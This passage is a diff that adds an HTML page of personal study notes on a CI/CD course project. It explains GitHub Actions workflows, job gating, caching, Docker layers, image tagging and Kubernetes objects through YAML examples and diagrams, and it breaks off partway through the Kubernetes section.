@@ -1,0 +1,939 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+</head>
+<body>
+<title>CI/CD Pipeline Primer</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Archivo:wdth,wght@75..125,500..800&family=IBM+Plex+Sans:ital,wght@0,400;0,600;1,400&family=IBM+Plex+Mono:wght@400;600&display=swap">
+<style>
+/* Layout: sticky stage index on the left, one reading column on the right; a pipeline rail opens the page. */
+:root {
+  --bg: #f3f5f7;
+  --surface: #ffffff;
+  --ink: #16212b;
+  --muted: #5b6977;
+  --line: #d9e0e6;
+  --accent: #0b7480;
+  --accent-soft: #e2f1f2;
+  --warn: #9a5a06;
+  --pass: #2f7d43;
+  --code-bg: #eaeef2;
+  --display: "Archivo", "Arial Narrow", system-ui, sans-serif;
+  --body: "IBM Plex Sans", system-ui, -apple-system, "Segoe UI", sans-serif;
+  --mono: "IBM Plex Mono", ui-monospace, "SF Mono", Menlo, Consolas, monospace;
+}
+@media (prefers-color-scheme: dark) {
+  :root:not([data-theme="light"]) {
+    --bg: #0e1317; --surface: #151c22; --ink: #e2e8ed; --muted: #95a3af; --line: #26313a;
+    --accent: #52c2cb; --accent-soft: #15302f; --warn: #e0a54a; --pass: #6cc488; --code-bg: #1b242b;
+    color-scheme: dark;
+  }
+}
+:root[data-theme="dark"] {
+  --bg: #0e1317; --surface: #151c22; --ink: #e2e8ed; --muted: #95a3af; --line: #26313a;
+  --accent: #52c2cb; --accent-soft: #15302f; --warn: #e0a54a; --pass: #6cc488; --code-bg: #1b242b;
+  color-scheme: dark;
+}
+
+* { box-sizing: border-box; }
+html { scroll-behavior: smooth; }
+@media (prefers-reduced-motion: reduce) { html { scroll-behavior: auto; } }
+body {
+  background: var(--bg); color: var(--ink);
+  font: 16px/1.65 var(--body);
+  padding-inline: 16px; padding-block: 0 64px;
+}
+a { color: var(--accent); text-underline-offset: 2px; }
+a:focus-visible, summary:focus-visible { outline: 2px solid var(--accent); outline-offset: 2px; border-radius: 3px; }
+
+/* ---------- header ---------- */
+.masthead { max-width: 1180px; margin: 0 auto; padding-block: 40px 28px; border-bottom: 1px solid var(--line); }
+.eyebrow { font: 600 12px/1 var(--mono); letter-spacing: .08em; text-transform: uppercase; color: var(--muted); }
+h1 {
+  font-family: var(--display); font-weight: 800; font-stretch: 85%;
+  font-size: clamp(2.2rem, 5vw, 3.6rem); line-height: 1.02; letter-spacing: -.01em;
+  margin: 12px 0 14px; text-wrap: balance;
+}
+.lede { max-width: 62ch; color: var(--muted); margin: 0 0 28px; font-size: 1.05rem; }
+
+/* pipeline rail: the project's real stage sequence */
+.rail { display: flex; flex-wrap: wrap; align-items: center; gap: 6px 0; font: 600 13px/1 var(--mono); }
+.stage { display: inline-flex; align-items: center; gap: 7px; padding: 8px 12px; background: var(--surface); border: 1px solid var(--line); border-radius: 999px; white-space: nowrap; }
+.stage::before { content: ""; width: 8px; height: 8px; border-radius: 50%; background: var(--pass); }
+.stage.gate { border-color: var(--accent); }
+.stage.gate::before { background: var(--accent); }
+.arrow { color: var(--muted); padding: 0 6px; }
+.rail-note { margin-top: 12px; font: 12px/1.5 var(--mono); color: var(--muted); }
+
+/* ---------- layout ---------- */
+.layout { max-width: 1180px; margin: 0 auto; display: grid; grid-template-columns: 250px minmax(0, 1fr); gap: 56px; padding-top: 32px; }
+nav.toc { position: sticky; top: calc(env(safe-area-inset-top, 0px) + 20px); align-self: start; max-height: calc(100vh - 40px); overflow-y: auto; }
+.toc-title { font: 600 12px/1 var(--mono); letter-spacing: .08em; text-transform: uppercase; color: var(--muted); margin-bottom: 12px; }
+nav.toc ol { list-style: none; margin: 0; padding: 0; display: grid; gap: 2px; }
+nav.toc a { display: grid; grid-template-columns: 26px 1fr; gap: 4px; padding: 5px 8px; border-radius: 6px; color: var(--ink); text-decoration: none; font-size: 14px; line-height: 1.35; }
+nav.toc a:hover { background: var(--accent-soft); }
+nav.toc a.active { background: var(--accent-soft); color: var(--accent); font-weight: 600; }
+nav.toc .n { font: 600 12px/1.6 var(--mono); color: var(--muted); font-variant-numeric: tabular-nums; }
+nav.toc a.active .n { color: var(--accent); }
+
+main { min-width: 0; max-width: 78ch; }
+
+/* ---------- content ---------- */
+main h2 {
+  font-family: var(--display); font-weight: 750; font-stretch: 90%;
+  font-size: 1.75rem; line-height: 1.15; margin: 56px 0 14px; text-wrap: balance;
+  padding-top: 18px; border-top: 2px solid var(--ink); scroll-margin-top: 16px;
+}
+main h2:first-child { margin-top: 0; }
+main h3 { font-family: var(--display); font-weight: 700; font-size: 1.15rem; margin: 30px 0 8px; text-wrap: balance; }
+main p, main li { max-width: 68ch; }
+main ul, main ol { padding-left: 1.3em; }
+main li { margin: 4px 0; }
+main li::marker { color: var(--muted); }
+strong { font-weight: 600; }
+
+code { font: .88em/1.5 var(--mono); background: var(--code-bg); padding: .1em .35em; border-radius: 4px; overflow-wrap: anywhere; }
+pre { margin: 16px 0 20px; overflow-x: auto; background: var(--surface); border: 1px solid var(--line); border-radius: 8px; padding: 16px 18px; }
+pre code { background: none; padding: 0; font-size: 13.5px; line-height: 1.55; overflow-wrap: normal; white-space: pre; }
+pre.diagram { border-left: 3px solid var(--accent); }
+pre.diagram code { line-height: 1.3; }
+.mobile-toc + h2 { margin-top: 0; }
+
+.table-wrap { overflow-x: auto; margin: 16px 0 22px; border: 1px solid var(--line); border-radius: 8px; background: var(--surface); }
+table { border-collapse: collapse; width: 100%; font-size: 14.5px; }
+th, td { text-align: left; vertical-align: top; padding: 9px 12px; border-bottom: 1px solid var(--line); }
+th { font: 600 12px/1.3 var(--mono); letter-spacing: .04em; text-transform: uppercase; color: var(--muted); background: var(--code-bg); }
+tr:last-child td { border-bottom: 0; }
+td code { white-space: nowrap; }
+
+/* self-check: flashcards */
+details { background: var(--surface); border: 1px solid var(--line); border-radius: 8px; padding: 0; margin: 8px 0; }
+details summary { cursor: pointer; padding: 12px 16px; font-weight: 600; list-style: none; display: grid; grid-template-columns: 1fr auto; gap: 12px; align-items: baseline; }
+details summary::-webkit-details-marker { display: none; }
+details summary::after { content: "Show answer"; font: 600 11px/1 var(--mono); letter-spacing: .06em; text-transform: uppercase; color: var(--accent); white-space: nowrap; }
+details[open] summary::after { content: "Hide"; }
+details[open] { border-color: var(--accent); }
+details[open] summary { border-bottom: 1px solid var(--line); }
+details .answer { padding: 12px 16px 14px; }
+
+/* gotchas list gets a warning tint */
+[id="16-gotchas-i-hit-or-that-the-rubric-targets"] + ol li::marker { color: var(--warn); font-weight: 600; }
+#key-points + ul { background: var(--accent-soft); border-radius: 8px; padding: 16px 20px 16px 2.2em; }
+
+.mobile-toc { display: none; }
+
+@media (max-width: 900px) {
+  .layout { grid-template-columns: minmax(0, 1fr); gap: 0; }
+  nav.toc { display: none; }
+  .mobile-toc { display: block; margin-bottom: 8px; }
+  .mobile-toc ol { list-style: none; padding: 0; margin: 0; display: grid; gap: 4px; }
+  .mobile-toc .n { display: inline-block; width: 28px; font: 600 12px/1.6 var(--mono); color: var(--muted); }
+  .mobile-toc ol a { text-decoration: none; }
+  .mobile-toc summary::after { content: "Open"; }
+  .mobile-toc[open] summary::after { content: "Close"; }
+  .mobile-toc .inner { padding: 4px 16px 0; }
+  main h2 { font-size: 1.45rem; }
+}
+</style>
+
+<header class="masthead">
+  <div class="eyebrow">Movie Picture Pipeline · review notes</div>
+  <h1>CI/CD with GitHub Actions, Docker &amp; Kubernetes</h1>
+  <p class="lede">The concepts behind the project, each shown first as real code from the repo, then explained, then boiled down to the gotchas worth remembering.</p>
+  <div class="rail" aria-label="Pipeline stages in this project">
+    <span class="stage">lint</span><span class="arrow">∥</span><span class="stage">test</span><span class="arrow">→</span>
+    <span class="stage gate">needs: [lint, test]</span><span class="arrow">→</span>
+    <span class="stage">build :sha</span><span class="arrow">→</span><span class="stage">push ECR</span><span class="arrow">→</span>
+    <span class="stage">kubectl apply</span><span class="arrow">→</span><span class="stage">rollout status</span><span class="arrow">→</span><span class="stage">smoke test</span>
+  </div>
+  <div class="rail-note">∥ parallel jobs · → sequential gate · a failure at any stage skips everything to its right</div>
+</header>
+
+<div class="layout">
+  <nav class="toc" aria-label="Sections">
+    <div class="toc-title">Sections</div>
+    <ol>
+<li><a href="#0-the-whole-picture-in-one-diagram"><span class="n">0</span>The whole picture in one diagram</a></li>
+<li><a href="#1-ci-vs-cd"><span class="n">1</span>CI vs. CD</a></li>
+<li><a href="#2-github-actions-anatomy"><span class="n">2</span>GitHub Actions anatomy</a></li>
+<li><a href="#3-job-dependencies-needs-is-the-quality-gate"><span class="n">3</span>Job dependencies: needs is the quality gate</a></li>
+<li><a href="#4-caching-making-ci-fast"><span class="n">4</span>Caching: making CI fast</a></li>
+<li><a href="#5-don-t-repeat-yourself-composite-actions-vs-reusable-workflows"><span class="n">5</span>Don't repeat yourself: composite actions vs. reusable workflows</a></li>
+<li><a href="#6-docker-images-layers-and-build-time-vs-runtime-config"><span class="n">6</span>Docker: images, layers, and build-time vs. runtime config</a></li>
+<li><a href="#7-registries-and-image-tags"><span class="n">7</span>Registries and image tags</a></li>
+<li><a href="#8-kubernetes-essentials"><span class="n">8</span>Kubernetes essentials</a></li>
+<li><a href="#9-kustomize-templating-without-templates"><span class="n">9</span>Kustomize: templating without templates</a></li>
+<li><a href="#10-secrets-and-credentials"><span class="n">10</span>Secrets and credentials</a></li>
+<li><a href="#11-eks-authentication-who-may-run-kubectl"><span class="n">11</span>EKS authentication: who may run kubectl?</a></li>
+<li><a href="#12-infrastructure-as-code-terraform-briefly"><span class="n">12</span>Infrastructure as Code (Terraform), briefly</a></li>
+<li><a href="#13-verifying-a-deploy-smoke-tests-and-rollback"><span class="n">13</span>Verifying a deploy: smoke tests and rollback</a></li>
+<li><a href="#14-pipeline-hygiene"><span class="n">14</span>Pipeline hygiene</a></li>
+<li><a href="#15-monitoring-and-logging-the-course-s-other-half"><span class="n">15</span>Monitoring and logging (the course's other half)</a></li>
+<li><a href="#16-gotchas-i-hit-or-that-the-rubric-targets"><span class="n">16</span>Gotchas I hit or that the rubric targets</a></li>
+<li><a href="#17-self-check-questions"><span class="n">17</span>Self-check questions</a></li>
+<li><a href="#key-points"><span class="n"></span>Key points</a></li>
+    </ol>
+  </nav>
+  <main>
+    <details class="mobile-toc">
+      <summary>Sections</summary>
+      <div class="inner"><ol>
+<li><a href="#0-the-whole-picture-in-one-diagram"><span class="n">0</span>The whole picture in one diagram</a></li>
+<li><a href="#1-ci-vs-cd"><span class="n">1</span>CI vs. CD</a></li>
+<li><a href="#2-github-actions-anatomy"><span class="n">2</span>GitHub Actions anatomy</a></li>
+<li><a href="#3-job-dependencies-needs-is-the-quality-gate"><span class="n">3</span>Job dependencies: needs is the quality gate</a></li>
+<li><a href="#4-caching-making-ci-fast"><span class="n">4</span>Caching: making CI fast</a></li>
+<li><a href="#5-don-t-repeat-yourself-composite-actions-vs-reusable-workflows"><span class="n">5</span>Don't repeat yourself: composite actions vs. reusable workflows</a></li>
+<li><a href="#6-docker-images-layers-and-build-time-vs-runtime-config"><span class="n">6</span>Docker: images, layers, and build-time vs. runtime config</a></li>
+<li><a href="#7-registries-and-image-tags"><span class="n">7</span>Registries and image tags</a></li>
+<li><a href="#8-kubernetes-essentials"><span class="n">8</span>Kubernetes essentials</a></li>
+<li><a href="#9-kustomize-templating-without-templates"><span class="n">9</span>Kustomize: templating without templates</a></li>
+<li><a href="#10-secrets-and-credentials"><span class="n">10</span>Secrets and credentials</a></li>
+<li><a href="#11-eks-authentication-who-may-run-kubectl"><span class="n">11</span>EKS authentication: who may run kubectl?</a></li>
+<li><a href="#12-infrastructure-as-code-terraform-briefly"><span class="n">12</span>Infrastructure as Code (Terraform), briefly</a></li>
+<li><a href="#13-verifying-a-deploy-smoke-tests-and-rollback"><span class="n">13</span>Verifying a deploy: smoke tests and rollback</a></li>
+<li><a href="#14-pipeline-hygiene"><span class="n">14</span>Pipeline hygiene</a></li>
+<li><a href="#15-monitoring-and-logging-the-course-s-other-half"><span class="n">15</span>Monitoring and logging (the course's other half)</a></li>
+<li><a href="#16-gotchas-i-hit-or-that-the-rubric-targets"><span class="n">16</span>Gotchas I hit or that the rubric targets</a></li>
+<li><a href="#17-self-check-questions"><span class="n">17</span>Self-check questions</a></li>
+<li><a href="#key-points"><span class="n"></span>Key points</a></li>
+      </ol></div>
+    </details>
+<h2 id="0-the-whole-picture-in-one-diagram">0. The whole picture in one diagram</h2>
+<pre class="diagram"><code> developer                GitHub                               AWS
+ ---------                ------                               ---
+ git push  ---&gt; PR  ---&gt; [ CI workflow ]
+ (branch)               lint || test --&gt; docker build
+                        (no secrets, no deploy)
+                               |
+                         review + merge
+                               v
+                  push to main ---&gt; [ CD workflow ]
+                                  lint || test
+                                       |
+                                       v
+                                   build image ---- docker push ---&gt; [ ECR ]
+                                   tag = git SHA                       |
+                                       |                               | image pull
+                                       v                               v
+                                  kubectl apply  ------------------&gt; [ EKS cluster ]
+                                  (kustomize)                     Deployment -&gt; Pods
+                                       |                          Service (LoadBalancer)
+                                       v                               |
+                                  smoke test  &lt;---- HTTP --------- [ ELB ] &lt;--- users
+                                  pass: done / fail: rollback
+</code></pre>
+<p>Keep this flow in mind. Everything below fills in one of its boxes.</p>
+
+<h2 id="1-ci-vs-cd">1. CI vs. CD</h2>
+<p><strong>Example.</strong> <code>frontend-ci.yaml</code> runs on pull requests and never touches AWS.
+<code>frontend-cd.yaml</code> runs on pushes to <code>main</code> and ends with <code>kubectl apply</code>.</p>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>Term</th>
+<th>Question it answers</th>
+<th>Trigger in this project</th>
+<th>Output</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Continuous <strong>Integration</strong></td>
+<td>"Is this change safe to merge?"</td>
+<td><code>pull_request</code> to <code>main</code></td>
+<td>a green or red check on the PR</td>
+</tr>
+<tr>
+<td>Continuous <strong>Delivery</strong></td>
+<td>"Could we release this right now?"</td>
+<td>merge to <code>main</code></td>
+<td>a deployable artifact; a human presses the release button</td>
+</tr>
+<tr>
+<td>Continuous <strong>Deployment</strong></td>
+<td>"Ship it."</td>
+<td>merge to <code>main</code></td>
+<td>running in production, no human step</td>
+</tr>
+</tbody>
+</table></div>
+<p>This project is continuous <strong>deployment</strong>: a merge goes straight to EKS.</p>
+<p><strong>Why split CI and CD into separate workflows?</strong>
+- <em>Different triggers.</em> PRs vs. merges.
+- <em>Different trust.</em> PRs, especially from forks, must never get cloud credentials. CI needs no secrets, so it gets none.
+- <em>Different blast radius.</em> A CI failure blocks a merge. A CD failure affects users.</p>
+<p><strong>Shift left.</strong> Find problems as early (and cheaply) as possible. Lint takes
+seconds and catches style or obvious bugs. Unit tests take seconds to minutes
+and catch logic bugs. A smoke test after deploy catches "it built but doesn't
+serve." Run them in order of cost, and fail fast.</p>
+
+<h2 id="2-github-actions-anatomy">2. GitHub Actions anatomy</h2>
+<p><strong>Example (trimmed <code>backend-ci.yaml</code>):</strong></p>
+<pre><code class="language-yaml">name: Backend Continuous Integration       # workflow name (shown in the UI)
+
+on:                                        # EVENTS that trigger it
+  pull_request:
+    branches: [main]                       #   filter: target branch
+    paths: [starter/backend/**]            #   filter: changed files
+  workflow_dispatch:                       #   &quot;Run workflow&quot; button
+
+jobs:
+  lint:                                    # JOB id
+    runs-on: ubuntu-latest                 #   RUNNER (fresh VM per job)
+    steps:                                 #   STEPS run sequentially
+      - uses: actions/checkout@v7          #     an ACTION (reusable unit)
+      - run: pipenv run lint               #     a shell command
+  test:
+    runs-on: ubuntu-latest
+    steps: [...]
+  build:
+    needs: [lint, test]                    # DEPENDENCY edge
+    runs-on: ubuntu-latest
+    steps: [...]
+</code></pre>
+<p>The hierarchy:</p>
+<pre class="diagram"><code> Workflow (.github/workflows/*.yaml)
+   |-- triggered by Events (push, pull_request, workflow_dispatch, schedule, ...)
+   +-- contains Jobs  --- run in PARALLEL by default, each on its OWN runner VM
+         +-- contain Steps --- run SEQUENTIALLY on the same VM, share the filesystem
+               +-- each step is `uses:` (an action) or `run:` (a shell script)
+</code></pre>
+<h3 id="mental-model-jobs-are-separate-machines">Mental model: jobs are separate machines</h3>
+<p>This idea explains most of Actions' behavior.</p>
+<ul>
+<li>Each job starts from a <strong>clean VM</strong>. Files from <code>lint</code> do <strong>not</strong> exist in <code>build</code>.
+  That's why every job does <code>checkout</code> and installs dependencies again, and why
+  caching matters (section 4).</li>
+<li>To pass <strong>small values</strong> between jobs, use <code>outputs</code>:</li>
+</ul>
+<p><code>yaml
+  build:
+    outputs:
+      image: ${{ steps.image.outputs.image }}     # expose a step output as a job output
+    steps:
+      - id: image
+        run: echo "image=$REGISTRY/backend:$GITHUB_SHA" &gt;&gt; "$GITHUB_OUTPUT"
+  deploy:
+    needs: build
+    steps:
+      - run: kustomize edit set image "backend=${{ needs.build.outputs.image }}"</code></p>
+<ul>
+<li>To pass <strong>files</strong> between jobs, use <code>actions/upload-artifact</code> and
+  <code>actions/download-artifact</code>. For container images, the registry <em>is</em> the
+  hand-off: build pushes to ECR and the cluster pulls from it.</li>
+</ul>
+<h3 id="triggers-worth-knowing">Triggers worth knowing</h3>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>Event</th>
+<th>Fires when</th>
+<th>Notes</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>push</code></td>
+<td>commits land on a branch</td>
+<td>filter with <code>branches</code>, <code>paths</code>, <code>tags</code></td>
+</tr>
+<tr>
+<td><code>pull_request</code></td>
+<td>a PR is opened, synchronized (new commits) or reopened</td>
+<td><code>branches</code> filters the <strong>target</strong> (base) branch; runs against a merge commit</td>
+</tr>
+<tr>
+<td><code>workflow_dispatch</code></td>
+<td>someone clicks "Run workflow" or runs <code>gh workflow run</code></td>
+<td>can declare typed <code>inputs</code></td>
+</tr>
+<tr>
+<td><code>schedule</code></td>
+<td>cron</td>
+<td>e.g. nightly dependency scans</td>
+</tr>
+<tr>
+<td><code>workflow_call</code></td>
+<td>another workflow calls this one</td>
+<td>makes it a <em>reusable workflow</em></td>
+</tr>
+</tbody>
+</table></div>
+<p><strong>Path filters gotcha.</strong> With <code>paths: [starter/backend/**]</code>, editing the
+workflow file itself would <em>not</em> trigger the workflow. That's why this repo
+also lists <code>.github/workflows/backend-ci.yaml</code> and the composite action path.</p>
+
+<h2 id="3-job-dependencies-needs-is-the-quality-gate">3. Job dependencies: <code>needs</code> is the quality gate</h2>
+<p><strong>Example:</strong></p>
+<pre><code class="language-yaml">build:
+  needs: [lint, test]
+</code></pre>
+<pre class="diagram"><code>  lint ---+
+          +--&gt; build --&gt; deploy        lint fails  ==&gt;  build: skipped
+  test ---+                                             deploy: skipped
+                                                        run:    FAILED
+</code></pre>
+<ul>
+<li>Jobs <strong>without</strong> <code>needs</code> run in parallel, so <code>lint</code> and <code>test</code> run at the same time.</li>
+<li>A job with <code>needs</code> runs only if <em>all</em> the listed jobs <strong>succeeded</strong>. Otherwise it's <em>skipped</em>.</li>
+<li>Skipping cascades: <code>deploy</code> needs <code>build</code>, so it's skipped too.</li>
+<li><strong>This is the rubric's auto-fail check.</strong> If <code>build</code> didn't <code>need</code> <code>test</code>, a
+  failing test could still produce a deployed image.</li>
+</ul>
+<h3 id="status-check-functions">Status-check functions</h3>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>Expression</th>
+<th>Job or step runs when</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><em>(default)</em> <code>success()</code></td>
+<td>all upstream succeeded</td>
+</tr>
+<tr>
+<td><code>failure()</code></td>
+<td>something upstream failed</td>
+</tr>
+<tr>
+<td><code>always()</code></td>
+<td>regardless, even if cancelled</td>
+</tr>
+<tr>
+<td><code>cancelled()</code></td>
+<td>the run was cancelled</td>
+</tr>
+</tbody>
+</table></div>
+<p>We use <code>if: always()</code> for the <code>report</code> and <code>notify</code> jobs so the team hears
+about failures too. Those jobs <strong>cannot</strong> make a failed run pass. The run's
+conclusion is failed if any job failed.</p>
+<p>We use <code>if: failure() &amp;&amp; steps.apply.outcome == 'success'</code> for rollback: only
+undo the deploy if <em>this run</em> actually applied a change.</p>
+
+<h2 id="4-caching-making-ci-fast">4. Caching: making CI fast</h2>
+<p><strong>Before (no cache):</strong> every job downloads about 1,500 npm packages.</p>
+<pre><code class="language-yaml">- uses: actions/setup-node@v7
+  with: { node-version: 18 }
+- run: npm ci
+</code></pre>
+<p><strong>After (built-in cache):</strong></p>
+<pre><code class="language-yaml">- uses: actions/setup-node@v7
+  with:
+    node-version-file: starter/frontend/.nvmrc       # single source of truth for the version
+    cache: npm                                       # cache ~/.npm
+    cache-dependency-path: starter/frontend/package-lock.json   # cache KEY = hash of lockfile
+- run: npm ci
+</code></pre>
+<p>How caching works:</p>
+<pre class="diagram"><code>  key = os + hash(package-lock.json)
+          |
+   cache hit? --yes--&gt; restore ~/.npm --&gt; npm ci (fast, offline-ish)
+          |
+          no --&gt; npm ci (slow) --&gt; at job end, save ~/.npm under key
+</code></pre>
+<ul>
+<li>The <strong>cache key</strong> must change when dependencies change. Hashing the lockfile does that.</li>
+<li><code>npm ci</code> vs. <code>npm install</code>. <code>ci</code> installs <em>exactly</em> what the lockfile says,
+  deletes <code>node_modules</code> first, and fails if <code>package.json</code> and the lockfile
+  disagree. That makes it reproducible, which is right for CI.</li>
+<li>Python equivalent: <code>actions/setup-python</code> with <code>cache: pipenv</code>, keyed on
+  <code>Pipfile.lock</code>. <code>pipenv install --deploy</code> is pipenv's <code>npm ci</code>: it fails if
+  the lockfile is stale.</li>
+<li><strong>Caches are not artifacts.</strong> A cache is a best-effort speed-up that may be
+  evicted. An artifact is a guaranteed output of a run.</li>
+</ul>
+
+<h2 id="5-don-t-repeat-yourself-composite-actions-vs-reusable-workflows">5. Don't repeat yourself: composite actions vs. reusable workflows</h2>
+<p><strong>Before:</strong> the same three steps are copied into lint, test and build in both
+frontend workflows, six times in all.</p>
+<p><strong>After:</strong> <code>.github/actions/setup-frontend/action.yml</code></p>
+<pre><code class="language-yaml">name: Setup frontend
+runs:
+  using: composite
+  steps:
+    - uses: actions/setup-node@v7
+      with: { node-version-file: starter/frontend/.nvmrc, cache: npm,
+              cache-dependency-path: starter/frontend/package-lock.json }
+    - run: npm ci
+      shell: bash                 # composite `run` steps MUST declare a shell
+      working-directory: starter/frontend
+</code></pre>
+<pre><code class="language-yaml"># in each job
+- uses: actions/checkout@v7                 # must run first: the action lives in the repo
+- uses: ./.github/actions/setup-frontend
+</code></pre>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th></th>
+<th>Composite action</th>
+<th>Reusable workflow (<code>workflow_call</code>)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Reuses</td>
+<td>a sequence of <strong>steps</strong></td>
+<td>entire <strong>jobs</strong> (with their own runners)</td>
+</tr>
+<tr>
+<td>Called from</td>
+<td>a step: <code>uses: ./.github/actions/x</code></td>
+<td>a job: <code>uses: ./.github/workflows/x.yaml</code></td>
+</tr>
+<tr>
+<td>Secrets</td>
+<td>inherits the job's environment</td>
+<td>must be passed explicitly (or <code>secrets: inherit</code>)</td>
+</tr>
+<tr>
+<td>Use when</td>
+<td>"every job starts with the same setup"</td>
+<td>"frontend and backend CD have the same lint, test, build, deploy shape"</td>
+</tr>
+</tbody>
+</table></div>
+
+<h2 id="6-docker-images-layers-and-build-time-vs-runtime-config">6. Docker: images, layers, and build-time vs. runtime config</h2>
+<p><strong>Example (<code>starter/frontend/Dockerfile</code>):</strong></p>
+<pre><code class="language-dockerfile">FROM node:18.14.2-alpine3.17
+ARG REACT_APP_MOVIE_API_URL                         # build-time variable (from --build-arg)
+ENV REACT_APP_MOVIE_API_URL=${REACT_APP_MOVIE_API_URL}
+WORKDIR /app
+COPY package*.json ./                               # layer A: rarely changes
+RUN npm ci                                          # layer B: cached unless A changed
+COPY . .                                            # layer C: changes every commit
+RUN npm run build                                   # layer D: bakes the URL into static JS
+CMD [&quot;npm&quot;, &quot;run&quot;, &quot;serve&quot;]
+</code></pre>
+<h3 id="layers-and-the-cache">Layers and the cache</h3>
+<p>Each instruction creates a layer. If a layer's inputs haven't changed, Docker
+reuses it, and <strong>everything after the first changed layer is rebuilt.</strong> So:</p>
+<pre class="diagram"><code>  COPY package*.json  -&gt; unchanged -&gt; CACHED
+  RUN npm ci          -&gt; unchanged -&gt; CACHED   (saves about a minute)
+  COPY . .            -&gt; CHANGED   -&gt; rebuild
+  RUN npm run build   -&gt;              rebuild
+</code></pre>
+<p><strong>Rule:</strong> copy dependency manifests and install first, then copy source code.</p>
+<p>On GitHub's ephemeral runners the local Docker cache disappears after every
+job. That's why we use Buildx with the <strong>GitHub Actions cache backend</strong>:</p>
+<pre><code class="language-yaml">- uses: docker/setup-buildx-action@v4
+- uses: docker/build-push-action@v7
+  with:
+    cache-from: type=gha,scope=frontend
+    cache-to:   type=gha,scope=frontend,mode=max   # max = cache intermediate layers too
+</code></pre>
+<h3 id="dockerignore"><code>.dockerignore</code></h3>
+<p>Without it, <code>COPY . .</code> sends the runner's <code>node_modules</code> into the image.
+That's slow and can be wrong: the runner uses Linux glibc, while the image is
+Alpine with musl, so native binaries may break. <code>.dockerignore</code> works like
+<code>.gitignore</code> for the build context.</p>
+<h3 id="build-time-vs-runtime-configuration">Build-time vs. runtime configuration</h3>
+<p>This is the key subtlety of the project.</p>
+<pre class="diagram"><code>   React (create-react-app)                 Flask
+   ------------------------                 -----
+   process.env.REACT_APP_X is replaced      os.getenv(&quot;X&quot;) is read
+   by a STRING LITERAL during `npm run      when the PROCESS STARTS
+   build`. The output is static JS.
+       =&gt; configure at BUILD time               =&gt; configure at RUN time
+          (--build-arg)                            (k8s env / ConfigMap)
+</code></pre>
+<ul>
+<li>The browser downloads static JS. There is no server-side env to read later.
+  So the backend URL <strong>must be known when the image is built</strong>, and changing it
+  means rebuilding.</li>
+<li>Consequence: frontend CD must resolve the backend URL <em>before</em> <code>docker build</code>.
+  This repo reads it from the live backend Service's load balancer.</li>
+<li>The smoke test greps the built JS bundle for that URL. That's the only way to
+  prove the build arg actually landed.</li>
+<li>Trade-off: one image per environment. The usual alternative is runtime
+  injection, such as serving a <code>config.js</code> generated at container start.</li>
+</ul>
+
+<h2 id="7-registries-and-image-tags">7. Registries and image tags</h2>
+<p><strong>Example:</strong> <code>123456789012.dkr.ecr.us-east-1.amazonaws.com/backend:5949d91e...</code> (full git SHA).</p>
+<pre class="diagram"><code>  &lt;registry host&gt;                         / &lt;repository&gt; : &lt;tag&gt;
+  123456789012.dkr.ecr.us-east-1.amazonaws.com / backend   : 5949d91e3f...
+</code></pre>
+<ul>
+<li><strong>ECR</strong> is AWS's private registry. CI authenticates with
+  <code>aws-actions/amazon-ecr-login</code>, which runs <code>docker login</code> with a short-lived
+  token.</li>
+<li><strong>Why tag with the git SHA, not <code>latest</code>?</strong></li>
+<li><em>Traceability.</em> <code>kubectl describe pod</code> shows the exact commit that's running.</li>
+<li><em>Immutability.</em> <code>:latest</code> points somewhere new after every push, so you can't tell what's deployed.</li>
+<li><em>Rollouts actually happen.</em> Kubernetes only rolls out when the pod spec
+    changes. Re-applying <code>image: backend:latest</code> is a no-op even if <code>latest</code>
+    now points to new bits.</li>
+<li><em>Rollback.</em> The previous ReplicaSet still references the old SHA.</li>
+<li>Use <code>${{ github.sha }}</code> in YAML, or <code>$GITHUB_SHA</code> in shell. They're the same value.</li>
+</ul>
+
+<h2 id="8-kubernetes-essentials">8. Kubernetes essentials</h2>
+<p><strong>Example:</strong> <code>starter/backend/k8s/</code></p>
+<pre><code class="language-yaml"># deployment.yaml (desired state: &quot;1 pod running image X&quot;)
+kind: Deployment
+spec:
+  replicas: 1
+  selector: { matchLabels: { app: backend } }
+  template:
+    metadata: { labels: { app: backend } }
+    spec:
+      containers:
+        - name: backend
+          image: backend              # placeholder, replaced by kustomize
+          ports: [{ containerPort: 5000 }]
+---
+# service.yaml (stable network endpoint)
+kind: Service
+spec:
+  type: LoadBalancer                  # on EKS, this provisions an AWS ELB
+  selector: { app: backend }          # routes to pods with this label
+  ports: [{ port: 80, targetPort: 5000 }]
+</code></pre>
+<p>How the objects relate:</p>
+<pre class="diagram"><code>  Internet --&gt; ELB :80 --&gt; Service &quot;backend&quot; --(label selector app=backend)--+
+                                                                             v
+  Deployment &quot;backend&quot; --manages--&gt; ReplicaSet (image=...:sha2) --&gt; Pod :5000
+                         (keeps old) ReplicaSet (image=...:sha1)  (scaled to 0)
+</code></pre>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>Object</th>
+<th>Role</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Pod</strong></td>
+<td>one or more containers; ephemeral; gets a new IP when recreated</td>
+</tr>
+<tr>
+<td><strong>ReplicaSet</strong></td>
+<td>keeps N identical pods alive</td>
+</tr>
+<tr>
+<td><strong>Deployment</strong></td>
+<td>manages ReplicaSets; rolling updates and rollback history</td>
+</tr>
+<tr>
+<td><strong>Service</strong></td>
+<td>stable name and IP in front of a changing set of pods, matched by <strong>labels</strong></td>
+</tr>
+<tr>
+<td><code>type: LoadBalancer</code></td>
+<td>asks the cloud for an external load balancer (an ELB on AWS)</td>
+</tr>
+</tbody>
+</table></div>
+<p><strong>Declarative model.</strong> <code>kubectl apply</code> says "make reality look like this
+YAML." Running it twice is safe (idempotent). Kubernetes controllers keep
+reconciling actual state toward the desired state.</p>
+<p><strong>Rolling update.</strong> When the pod template changes (a new image tag), the
